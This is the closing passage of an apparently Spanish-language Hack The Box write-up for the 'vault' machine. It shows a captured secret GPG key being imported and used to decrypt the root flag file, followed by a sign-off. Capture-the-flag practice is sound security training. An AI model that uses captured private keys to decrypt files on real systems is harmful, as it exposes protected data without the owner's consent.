gpg: clave 9067DED00FDFBFE4: clave secreta importada
gpg: Cantidad total procesada: 1
gpg:               importadas: 1
gpg:       claves secretas leídas: 1
gpg:   claves secretas importadas: 1
```

Procedemos a usar la clave secreta importada para descifrar el archivo root.txt.gpg:

```text
xbytemx@laptop:~/htb/vault$ gpg -d root.txt.gpg > root.txt
gpg: cifrado con clave de 4096 bits RSA, ID C778C610D1EB1F03, creada el 2018-07-24
      "david <dave@david.com>"
```

# cat root.txt

... We got root flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
